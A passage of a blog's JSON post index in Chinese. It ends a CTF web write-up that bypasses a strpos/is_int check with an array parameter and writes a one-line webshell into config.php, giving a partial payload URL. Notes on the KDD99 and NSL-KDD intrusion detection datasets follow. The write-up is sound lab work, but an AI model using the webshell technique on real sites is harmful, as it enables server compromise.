)，此时可以利用strpos传入数组时会返回null，经is_int判断后返回false，即可绕过第一个条件判断（看起来stripos也存在这个问题）；这时候就可以通过file_put_content将一句话木马写入config.php了(其实只写一个&lt;即可得到flag)。 payload:http://vps1.blue-whale.me:23360/user/b4466a4c89f48932020df576d9a77e41902f5a0e/index.php?content[]=","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"毕业设计笔记","date":"2020-01-20T08:11:02.000Z","path":"2020-01-20/毕业设计笔记/","text":"随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。 网络异常流量检测研究数据集选择 KDD99该数据集是从一个模拟的美国空军局域网上采集来的9个星期的网络连接数据,分成具有标识的训练数据和未加标识的测试数据。测试数据和训练数据有着不同的概率分布,测试数据包含了一些未出现在训练数据中的攻击类型,这使得入侵检测更具有现实性。 NSL-KDD该数据集解决了KDD99数据集中存在的固有问题。NSL-KDD数据集由于缺少基于入侵检测网络的公共数据集，所以NSL-KDD数据集仍然存在一些问题，同时也不是现有真实网络的完美代表。但它仍然可以用作有效的基准数据集，以帮助研究人员比较不同的入侵检测方法。NSL-KDD训练集和测试集的设置是合理的，不同研究工作的评估结果将是一致的和可比的。二者具体区别见下： It does not include redundant records in the train set, so the classifiers will not be biased towards more frequent records. NSL-KDD数据集的训练集中不包含冗余记录，所以分类器不会偏向更频繁的记录； There is no duplicate records in the proposed test sets; therefore, the performance of the learners are not biased by the methods which have better detection rates on the frequent records. NSL-KDD数据集的测试集中没有重复的记录，使得检测率更为准确。 The number of selected records from each difficultylevel group is inversely proportional to the percentage of records in the original KDD data set. As a result, the classification rates of distinct machine learning methods vary in a wider range, which makes it more efficient to have an accurate evaluation of different learning techniques. 来自每个难度级别组的所选记录的数量与原始KDD数据集中的记录的百分比成反比。结果，不同机器学习方法的分类率在更宽的范围内变化，这使得对不同学习技术的准确评估更有效。 The number of records in the train and test sets are reasonable, which makes it affordable to run the experiments on the complete set without the need to randomly select a small portion. Consequently, evaluation results of different research works will be consistent and comparable. 训练和测试中的记录数量设置是合理的，这使得在整套实验上运行实验成本低廉而无需随机选择一小部分。因此，不同研究工作的评估结果将是一致的和可比较的。 常用的深度学习算法","tags":[{"name":"IDS","slug":"IDS","permalink":"https://purewhitywhite.github.io/tags/IDS/"}]},{"title":"我的第一篇博客","date":"2019-06-01T13:39:12.000Z","path":"2019-06-01/我的第一篇博客/","text":"Better late than never,huh?","tags":[]}]